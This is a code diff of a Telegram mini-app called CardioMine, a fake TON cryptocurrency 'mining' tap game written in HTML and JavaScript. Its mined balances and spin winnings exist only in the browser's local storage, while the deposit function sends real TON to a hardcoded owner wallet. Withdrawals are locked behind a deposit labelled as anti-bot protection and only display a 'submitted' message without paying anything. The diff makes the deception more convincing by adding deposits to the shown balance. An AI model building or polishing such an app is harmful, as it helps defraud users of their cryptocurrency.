@@ -1,102 +1,108 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>CardioMine - TON Mine V3</title>
+<title>CardioMine - TON Wallet V3.2</title>
 <script src="https://cdn.tailwindcss.com"></script>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-<style>
-body{background:#0a0e1a;color:white;font-family:Inter,sans-serif;overflow:hidden}
-.ton-coin{background: radial-gradient(circle at 30% 30%, #2aabee, #0f6fb5); box-shadow: 0 0 40px rgba(42,171,238,0.5);}
-.wheel{transition: transform 4s cubic-bezier(0.2,0.8,0.2,1);}
-</style>
+<style>body{background:#0a0e1a;color:white;font-family:sans-serif;overflow:hidden}.ton-coin{background:radial-gradient(circle at 30% 30%,#2aabee,#0f6fb5);box-shadow:0 0 40px rgba(42,171,238,0.5)}.wheel{transition:transform 4s cubic-bezier(0.2,0.8,0.2,1)}</style>
 </head>
 <body class="h-screen flex flex-col">
-<div class="flex justify-between items-center p-4">
-  <div class="flex gap-2 items-center"><img src="https://ton.org/download/ton_symbol.png" class="w-8 h-8 bg-white rounded-full p-1"><div><p class="text-xs opacity-60">Balance</p><p id="balance" class="font-extrabold">0.000 TON</p></div></div>
-  <div id="ton-connect"></div>
-</div>
+<div class="flex justify-between items-center p-4"><div class="flex gap-2 items-center"><img src="https://ton.org/download/ton_symbol.png" class="w-8 h-8 bg-white rounded-full p-1"><div><p class="text-xs opacity-60">Balance</p><p id="balance" class="font-extrabold">0.000 TON</p></div></div><div id="ton-connect"></div></div>
 
-<!-- MINE -->
-<div id="p-mine" class="page flex-1 flex flex-col items-center justify-center p-4">
-  <p class="opacity-60 text-sm">Mining Speed <span id="speed" class="text-white font-bold">1.0</span> TON/h ⚡ | Level: <span id="level">Bronze</span></p>
-  <div class="w-64 h-2 bg-gray-800 rounded-full mt-2"><div id="energy-bar" class="h-full bg-cyan-300" style="width:100%"></div></div>
-  <div id="coin" class="ton-coin w-60 h-60 rounded-full flex items-center justify-center text-7xl mt-6 active:scale-95 transition">💎</div>
-  <p class="mt-4 text-xs opacity-60"><span id="energy">1000</span>/1000</p>
-  <button id="claim" class="mt-4 bg-white text-black px-10 py-3 rounded-full font-bold">Claim <span id="claim-amount">0</span></button>
-</div>
+<div id="p-mine" class="page flex-1 flex flex-col items-center justify-center p-4"><p class="opacity-60 text-xs">Speed <span id="speed" class="font-bold text-white">1.0</span> TON/h | <span id="level">Bronze</span></p><div class="w-64 h-2 bg-gray-800 rounded-full mt-2"><div id="energy-bar" class="h-full bg-cyan-300" style="width:100%"></div></div><div id="coin" class="ton-coin w-56 h-56 rounded-full flex items-center justify-center text-6xl mt-6">💎</div><p class="mt-3 text-xs opacity-60"><span id="energy">1000</span>/1000</p><button id="claim" class="mt-4 bg-white text-black px-10 py-3 rounded-full font-bold">Claim <span id="claim-amount">0</span></button></div>
 
-<!-- TASKS -->
 <div id="p-tasks" class="page hidden flex-1 p-4 overflow-auto"><h2 class="text-xl font-bold">Tasks ⚡</h2><div id="task-list" class="space-y-2 mt-4"></div></div>
 
-<!-- FRIENDS -->
-<div id="p-friends" class="page hidden flex-1 p-4"><h2 class="text-xl font-bold">Invite</h2><div class="bg-[#141a2e] p-4 rounded-2xl mt-4 text-center"><p id="invite-code" class="text-2xl font-bold">CARDIO123</p><button onclick="copyInvite()" class="w-full mt-3 bg-[#2aabee] py-3 rounded-xl font-bold">Copy Invite Link</button></div></div>
+<div id="p-friends" class="page hidden flex-1 p-4"><h2 class="text-xl font-bold">Invite Friends</h2><div class="bg-[#141a2e] p-4 rounded-2xl mt-4 text-center"><p id="invite-code" class="text-2xl font-bold">CARDIO123</p><button onclick="copyInvite()" class="w-full mt-3 bg-[#2aabee] py-3 rounded-xl font-bold">Copy Invite Link</button></div></div>
 
-<!-- DEPOSIT -->
-<div id="p-deposit" class="page hidden flex-1 p-4 overflow-auto">
-  <h2 class="text-xl font-bold">Deposit TON</h2>
-  <p class="text-xs opacity-60 mt-1">Deposit to unlock Withdraw & Spin. Your deposits: <span id="total-dep" class="font-bold text-cyan-300">0</span> TON</p>
-  <div class="grid grid-cols-3 gap-2 mt-4">
-    <button onclick="deposit(2)" class="bg-[#141a2e] p-4 rounded-2xl font-bold">$2<br><span class="text-xs opacity-60">~0.5 TON</span></button>
-    <button onclick="deposit(5)" class="bg-[#141a2e] p-4 rounded-2xl font-bold border border-cyan-400">$5<br><span class="text-xs opacity-60">~1.2 TON</span></button>
-    <button onclick="deposit(10)" class="bg-[#141a2e] p-4 rounded-2xl font-bold">$10<br><span class="text-xs opacity-60">~2.5 TON</span></button>
+<!-- NEW WALLET PAGE - Everything inside -->
+<div id="p-wallet" class="page hidden flex-1 p-4 overflow-auto">
+  <h2 class="text-xl font-bold">Wallet</h2>
+  <!-- Balance Card -->
+  <div class="bg-[#141a2e] p-4 rounded-2xl mt-4">
+    <p class="text-xs opacity-60">Accumulated Balance</p>
+    <p id="wallet-balance" class="text-3xl font-extrabold">0.000 TON</p>
+    <p class="text-xs mt-1 opacity-60">Deposited: <span id="total-dep" class="text-cyan-300 font-bold">0.00 TON</span> | Mined: <span id="mined-bal" class="font-bold">0.00 TON</span></p>
   </div>
-  <p class="text-xs mt-4 opacity-70">Deposits go to owner wallet and increase mining speed x2.</p>
+
+  <!-- Deposit Section -->
+  <h3 class="font-bold mt-6">Deposit</h3>
+  <div class="grid grid-cols-3 gap-2 mt-2">
+    <button onclick="deposit(2)" class="bg-[#1e2a4a] p-3 rounded-xl font-bold border border-gray-700">$2<br><span class="text-[10px] opacity-60">0.5 TON</span></button>
+    <button onclick="deposit(5)" class="bg-[#1e2a4a] p-3 rounded-xl font-bold border border-cyan-400">$5<br><span class="text-[10px] opacity-60">1.2 TON</span></button>
+    <button onclick="deposit(10)" class="bg-[#1e2a4a] p-3 rounded-xl font-bold border border-gray-700">$10<br><span class="text-[10px] opacity-60">2.5 TON</span></button>
+  </div>
+
+  <!-- Withdraw Section -->
+  <h3 class="font-bold mt-6">Withdraw</h3>
+  <div id="warn-dep" class="bg-yellow-900/40 border border-yellow-500 p-3 rounded-xl mt-2 text-xs">⚠️ To withdraw, you must have deposited at least $2 (0.5 TON) first. Anti-bot protection.</div>
+  <input id="w-addr" placeholder="Your TON wallet address" class="w-full mt-3 p-3 rounded-xl bg-[#141a2e] outline-none text-sm">
+  <input id="w-amount" type="number" placeholder="Amount min 1 TON" class="w-full mt-2 p-3 rounded-xl bg-[#141a2e] outline-none text-sm">
+  <button onclick="doWithdraw()" class="w-full mt-3 bg-white text-black py-3 rounded-xl font-bold">Request Withdraw</button>
+  <p id="w-msg" class="text-xs mt-3 text-center opacity-70"></p>
 </div>
 
-<!-- WITHDRAW -->
-<div id="p-withdraw" class="page hidden flex-1 p-4">
-  <h2 class="text-xl font-bold">Withdraw</h2>
-  <div id="warn-dep" class="bg-yellow-900/50 border border-yellow-500 p-3 rounded-xl mt-4 text-sm">⚠️ To withdraw, you must have deposited at least $2 (0.5 TON) first. This is anti-bot protection.</div>
-  <input id="w-addr" placeholder="Your TON wallet address" class="w-full mt-4 p-3 rounded-xl bg-[#141a2e] outline-none">
-  <input id="w-amount" type="number" placeholder="Amount (min 1 TON)" class="w-full mt-2 p-3 rounded-xl bg-[#141a2e] outline-none">
-  <button onclick="doWithdraw()" class="w-full mt-4 bg-white text-black py-3 rounded-xl font-bold">Request Withdraw</button>
-  <p id="w-msg" class="text-sm mt-3 text-center opacity-70"></p>
-</div>
+<div id="p-spin" class="page hidden flex-1 p-4 flex flex-col items-center"><h2 class="text-xl font-bold">Spin Wheel</h2><div id="spin-lock" class="bg-red-900/50 border border-red-500 p-3 rounded-xl mt-4 text-sm w-full text-center">🔒 Deposit more than $5 to unlock Spin</div><div id="wheel" class="w-60 h-60 rounded-full border-4 border-cyan-400 mt-6 flex items-center justify-center text-5xl wheel">🎡</div><button onclick="spin()" class="mt-6 bg-[#2aabee] px-10 py-3 rounded-full font-bold">SPIN</button></div>
 
-<!-- SPIN -->
-<div id="p-spin" class="page hidden flex-1 p-4 flex flex-col items-center">
-  <h2 class="text-xl font-bold">Spin Wheel</h2>
-  <div id="spin-lock" class="bg-red-900/50 border border-red-500 p-3 rounded-xl mt-4 text-sm w-full text-center">🔒 Deposit more than $5 (1.2 TON) to unlock Spin Wheel</div>
-  <div class="w-64 h-64 rounded-full border-4 border-cyan-400 mt-6 flex items-center justify-center text-5xl wheel" id="wheel">🎡</div>
-  <button onclick="spin()" class="mt-6 bg-[#2aabee] px-10 py-3 rounded-full font-bold">SPIN</button>
-</div>
-
-<!-- NAV -->
-<div class="grid grid-cols-6 bg-[#141a2e] p-2 gap-1 rounded-t-2xl text-[10px]">
-  <button onclick="showPage('mine')" class="nav py-2 bg-white text-black rounded-xl font-bold" id="n-mine">Mine</button>
-  <button onclick="showPage('tasks')" class="nav py-2 opacity-60" id="n-tasks">Tasks</button>
-  <button onclick="showPage('friends')" class="nav py-2 opacity-60" id="n-friends">Friends</button>
-  <button onclick="showPage('deposit')" class="nav py-2 opacity-60" id="n-deposit">Deposit</button>
-  <button onclick="showPage('withdraw')" class="nav py-2 opacity-60" id="n-withdraw">Withdraw</button>
-  <button onclick="showPage('spin')" class="nav py-2 opacity-60" id="n-spin">Spin</button>
+<div class="grid grid-cols-5 bg-[#141a2e] p-2 gap-1 rounded-t-2xl text-[10px] text-center">
+<button onclick="showPage('mine')" id="n-mine" class="py-3 bg-white text-black rounded-xl font-bold">Mine</button>
+<button onclick="showPage('tasks')" id="n-tasks" class="py-3 opacity-60">Tasks</button>
+<button onclick="showPage('friends')" id="n-friends" class="py-3 opacity-60">Friends</button>
+<button onclick="showPage('wallet')" id="n-wallet" class="py-3 opacity-60">Wallet</button>
+<button onclick="showPage('spin')" id="n-spin" class="py-3 opacity-60">Spin</button>
 </div>
 
 <script>
-const OWNER_WALLET = "UQCoeUpYXOSLpTKIxYOIY_3dRoZYzmtRCrARH7D0EARw8NHC
-const tg = Telegram.WebApp; tg.expand();
+const OWNER_WALLET = "UQCoeUpYXOSLpTKIxYOIY_3dRoZYzmtRCrARH7D0EARw8NHC";
+const tg = window.Telegram.WebApp; tg.expand(); tg.ready();
 let coins=parseFloat(localStorage.getItem('cm_coins')||'0'), energy=parseInt(localStorage.getItem('cm_energy')||'1000'), speed=parseFloat(localStorage.getItem('cm_speed')||'1'), pending=0, totalDep=parseFloat(localStorage.getItem('cm_dep')||'0');
 let tasks=JSON.parse(localStorage.getItem('cm_tasks')||'{}');
 let code=localStorage.getItem('cm_code')||'CARDIO'+Math.floor(1000+Math.random()*9000); localStorage.setItem('cm_code',code);
 document.getElementById('invite-code').innerText=code;
-function save(){localStorage.setItem('cm_coins',coins);localStorage.setItem('cm_energy',energy);localStorage.setItem('cm_speed',speed);localStorage.setItem('cm_dep',totalDep);localStorage.setItem('cm_tasks',JSON.stringify(tasks));document.getElementById('balance').innerText=coins.toFixed(3)+' TON';document.getElementById('speed').innerText=speed.toFixed(1);document.getElementById('total-dep').innerText=totalDep.toFixed(2);document.getElementById('energy').innerText=energy;let lvl=speed<2?'Bronze':speed<5?'Silver':speed<10?'Gold':'Diamond';document.getElementById('level').innerText=lvl;checkLocks();}
+function save(){
+  localStorage.setItem('cm_coins',coins);localStorage.setItem('cm_energy',energy);localStorage.setItem('cm_speed',speed);localStorage.setItem('cm_dep',totalDep);localStorage.setItem('cm_tasks',JSON.stringify(tasks));
+  document.getElementById('balance').innerText=coins.toFixed(3)+' TON';
+  document.getElementById('wallet-balance').innerText=coins.toFixed(3)+' TON';
+  document.getElementById('total-dep').innerText=totalDep.toFixed(2)+' TON';
+  document.getElementById('mined-bal').innerText=(coins-totalDep>0?coins-totalDep:0).toFixed(3)+' TON';
+  document.getElementById('speed').innerText=speed.toFixed(1);document.getElementById('energy').innerText=energy;
+  let lvl=speed<2?'Bronze':speed<5?'Silver':speed<10?'Gold':'Diamond';document.getElementById('level').innerText=lvl;
+  checkLocks();
+}
 function checkLocks(){document.getElementById('warn-dep').style.display=totalDep>=0.5?'none':'block';document.getElementById('spin-lock').style.display=totalDep>=1.2?'none':'block';}
-save();checkLocks();
+save();
 const taskData=[{id:'join',title:'Join Channel',s:0.5},{id:'x',title:'Follow X',s:0.5},{id:'daily',title:'Daily Bonus',s:0.2,c:0.2},{id:'wallet',title:'Connect Wallet',s:1}];
-function renderTasks(){let h='';taskData.forEach(t=>{h+=`<div class="bg-[#141a2e] p-3 rounded-xl flex justify-between"><div><p class="font-bold text-sm">${t.title}</p><p class="text-xs text-cyan-300">+${t.s} speed</p></div><button onclick="doTask('${t.id}')" class="px-4 py-1 bg-white text-black rounded-lg font-bold text-sm">${tasks[t.id]?'Done':'Go'}</button></div>`});document.getElementById('task-list').innerHTML=h;}
+function renderTasks(){let h='';taskData.forEach(t=>{h+=`<div class="bg-[#141a2e] p-3 rounded-xl flex justify-between items-center"><div><p class="font-bold text-sm">${t.title}</p><p class="text-xs text-cyan-300">+${t.s} speed</p></div><button onclick="doTask('${t.id}')" class="px-5 py-2 bg-white text-black rounded-lg font-bold text-sm">${tasks[t.id]?'Done ✓':'Go'}</button></div>`});document.getElementById('task-list').innerHTML=h;}
 renderTasks();
-function doTask(id){if(tasks[id])return;tasks[id]=true;let t=taskData.find(x=>x.id==id);speed+=t.s;if(t.c)coins+=t.c;save();renderTasks();}
-document.getElementById('coin').onclick=()=>{if(energy<=0)return;energy--;pending+=0.001*speed;document.getElementById('claim-amount').innerText=pending.toFixed(3);document.getElementById('energy-bar').style.width=energy/10+'%';save();};
-document.getElementById('claim').onclick=()=>{coins+=pending;pending=0;document.getElementById('claim-amount').innerText='0';save();};
-function showPage(p){document.querySelectorAll('.page').forEach(e=>e.classList.add('hidden'));document.getElementById('p-'+p).classList.remove('hidden');document.querySelectorAll('.nav').forEach(e=>e.className='nav py-2 opacity-60');document.getElementById('n-'+p).className='nav py-2 bg-white text-black rounded-xl font-bold';}
-function copyInvite(){navigator.clipboard.writeText(`https://t.me/Cardiomine_bot?start=${code}`);tg.showAlert('Copied!');}
+window.doTask=function(id){if(tasks[id])return;tasks[id]=true;let t=taskData.find(x=>x.id==id);speed+=t.s;if(t.c)coins+=t.c;save();renderTasks();tg.showAlert('Done! +'+t.s+' speed');}
+window.showPage=function(p){document.querySelectorAll('.page').forEach(e=>{e.classList.add('hidden'); e.style.display='none';}); let el=document.getElementById('p-'+p); el.classList.remove('hidden'); el.style.display='flex'; if(p!=='spin' && p!=='mine') el.style.display='block'; if(p==='mine' || p==='spin') el.style.display='flex'; document.querySelectorAll('[id^="n-"]').forEach(e=>{e.className='py-3 opacity-60';}); document.getElementById('n-'+p).className='py-3 bg-white text-black rounded-xl font-bold';}
+window.copyInvite=function(){navigator.clipboard.writeText(`https://t.me/Cardiomine_bot?start=${code}`);tg.showAlert('Copied!');}
+const coinEl=document.getElementById('coin');
+function tapCoin(e){if(e) e.preventDefault(); if(energy<=0){tg.showAlert('No energy!');return;} energy--; pending+=0.001*speed; document.getElementById('claim-amount').innerText=pending.toFixed(3); document.getElementById('energy-bar').style.width=energy/10+'%'; coinEl.style.transform='scale(0.92)'; setTimeout(()=>coinEl.style.transform='scale(1)',100); save();}
+coinEl.addEventListener('click', tapCoin); coinEl.addEventListener('touchstart', tapCoin, {passive:false});
+document.getElementById('claim').addEventListener('click', ()=>{coins+=pending;pending=0;document.getElementById('claim-amount').innerText='0';save();});
 const tonConnectUI=new TON_CONNECT_UI.TonConnectUI({manifestUrl:'https://cardiojay497-cmd.github.io/Cardio-mine/tonconnect-manifest.json',buttonRootId:'ton-connect'});
-async function deposit(dollars){let ton = dollars*0.25;if(!tonConnectUI.connected){tg.showAlert('Connect wallet first at top!');return;}try{const tx={validUntil:Math.floor(Date.now()/1000)+600,messages:[{address:OWNER_WALLET,amount:(ton*1e9).toString()}]};await tonConnectUI.sendTransaction(tx);totalDep+=ton;speed+=0.5;save();tg.showAlert(`Deposited $${dollars} ~ ${ton} TON! Speed boosted!`);}catch(e){tg.showAlert('Deposit cancelled');}}
-function doWithdraw(){let amt=parseFloat(document.getElementById('w-amount').value);let addr=document.getElementById('w-addr').value;if(totalDep<0.5){document.getElementById('w-msg').innerText='⚠️ You must deposit at least $2 (0.5 TON) before withdraw.';return;}if(amt<1){document.getElementById('w-msg').innerText='Min withdraw 1 TON';return;}if(amt>coins){document.getElementById('w-msg').innerText='Not enough balance';return;}if(!addr){document.getElementById('w-msg').innerText='Enter wallet address';return;}document.getElementById('w-msg').innerText=`Withdraw request of ${amt} TON to ${addr.slice(0,6)}... submitted! (Manual review)`;coins-=amt;save();}
-function spin(){if(totalDep<1.2){tg.showAlert('🔒 Deposit $5+ to unlock Spin Wheel');return;}let w=document.getElementById('wheel');w.style.transform=`rotate(${720+Math.random()*720}deg)`;setTimeout(()=>{let reward=Math.random()*0.5;coins+=reward;save();tg.showAlert(`You won ${reward.toFixed(3)} TON!`);},4000);}
-setInterval(()=>{if(energy<1000){energy++;save();}},2000);
+window.deposit=async function(dollars){
+  let ton=dollars*0.25;
+  if(!tonConnectUI.connected){tg.showAlert('Connect wallet first at top!');return;}
+  try{
+    const tx={validUntil:Math.floor(Date.now()/1000)+600,messages:[{address:OWNER_WALLET,amount:(ton*1e9).toString()}]};
+    await tonConnectUI.sendTransaction(tx);
+    totalDep+=ton;
+    coins+=ton; // <-- NOW IT SHOWS IN BALANCE!
+    speed+=0.5;
+    save();
+    tg.showAlert(`Success! $${dollars} added to Balance!`);
+    showPage('wallet');
+  }catch(e){tg.showAlert('Cancelled');}
+}
+window.doWithdraw=function(){let amt=parseFloat(document.getElementById('w-amount').value);let addr=document.getElementById('w-addr').value;if(totalDep<0.5){document.getElementById('w-msg').innerText='⚠️ You must deposit at least $2 (0.5 TON) before withdraw.';return;}if(amt<1){document.getElementById('w-msg').innerText='Min withdraw 1 TON';return;}if(amt>coins){document.getElementById('w-msg').innerText='Not enough balance';return;}if(!addr){document.getElementById('w-msg').innerText='Enter wallet';return;}document.getElementById('w-msg').innerText=`Request ${amt} TON to ${addr.slice(0,6)}... submitted!`;coins-=amt;save();}
+window.spin=function(){if(totalDep<1.2){tg.showAlert('🔒 Deposit $5+ to unlock');return;}let w=document.getElementById('wheel');w.style.transform=`rotate(${720+Math.random()*720}deg)`;setTimeout(()=>{let r=Math.random()*0.5;coins+=r;save();tg.showAlert(`Won ${r.toFixed(3)} TON!`);},4000);}
+setInterval(()=>{if(energy<1000){energy++;save();}},1500);
+showPage('mine');
 </script>
 </body>
-  </html>
+</html>
